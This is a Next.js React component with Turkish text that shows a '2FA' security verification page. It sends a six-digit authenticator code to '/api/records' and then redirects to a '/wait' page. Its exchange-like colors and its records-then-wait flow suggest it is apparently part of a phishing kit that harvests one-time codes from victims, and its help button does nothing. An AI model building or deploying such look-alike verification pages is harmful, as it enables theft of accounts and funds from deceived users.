"use client"
import { useState } from 'react'
import { useRouter } from 'next/navigation'

const AuthenticatorVerification = () => {
  const router = useRouter()
  const [authCode, setAuthCode] = useState('')
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  
  // Sadece sayı girişi için kontrol
  const handleAuthCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '') // Sadece sayıları al
    if (value.length <= 6) { // Maksimum 6 hane
      setAuthCode(value)
      setError('')
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')
    
    // 6 haneli kod kontrolü
    if (authCode.length !== 6) {
      setError('Lütfen 6 haneli Authenticator kodunu girin')
      return
    }

    setIsLoading(true)
    try {
      // API'ye authenticator kodunu gönder
      const response = await fetch('/api/records', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          auth: authCode
        })
      })

      const data = await response.json()

      if (data.success) {
        // Başarılı ise wait sayfasına yönlendir
        router.push('/wait')
      } else {
        setError('Authenticator kodu doğrulanamadı. Lütfen tekrar deneyin.')
      }
    } catch (error) {
      console.error('Authenticator verification error:', error)
      setError('Bir hata oluştu. Lütfen tekrar deneyin.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#FAFAFA] flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[420px] bg-white rounded-lg shadow-sm p-8">
        {/* Header */}
        <h1 className="text-[#1E2329] text-2xl font-medium text-center mb-6">
          2FA
        </h1>

        {/* Verification Form */}
        <div className="space-y-6">
          <div>
            <h2 className="text-[#1E2329] text-lg font-medium mb-2">Güvenlik doğrulaması</h2>
            <p className="text-[#707A8A] text-sm mb-6">
              Hesabınızı güvence altına almak için lütfen aşağıdaki doğrulamayı tamamlayın.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-[#707A8A] text-sm mb-2" htmlFor="authCode">
                Authenticator Kod
              </label>
              <input
                id="authCode"
                type="text"
                maxLength={6}
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="000000"
                className="w-full px-0 py-3 border-0 text-black border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors"
                value={authCode}
                onChange={handleAuthCodeChange}
                disabled={isLoading}
              />
              {error && (
                <p className="text-[#F6465D] text-sm mt-1">{error}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full bg-[#FCD535] text-[#1E2329] font-bold rounded-md py-3 hover:bg-[#FCD535]/90 transition disabled:opacity-50"
              disabled={isLoading}
            >
              {isLoading ? 'İşleniyor...' : 'Onayla'}
            </button>
          </form>

          <div className="text-center">
            <button 
              className="text-[#F0B90B] hover:text-[#F0B90B]/80 text-sm"
              disabled={isLoading}
            >
              Güvenlik doğrulaması kullanılamıyor mu?
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

export default AuthenticatorVerification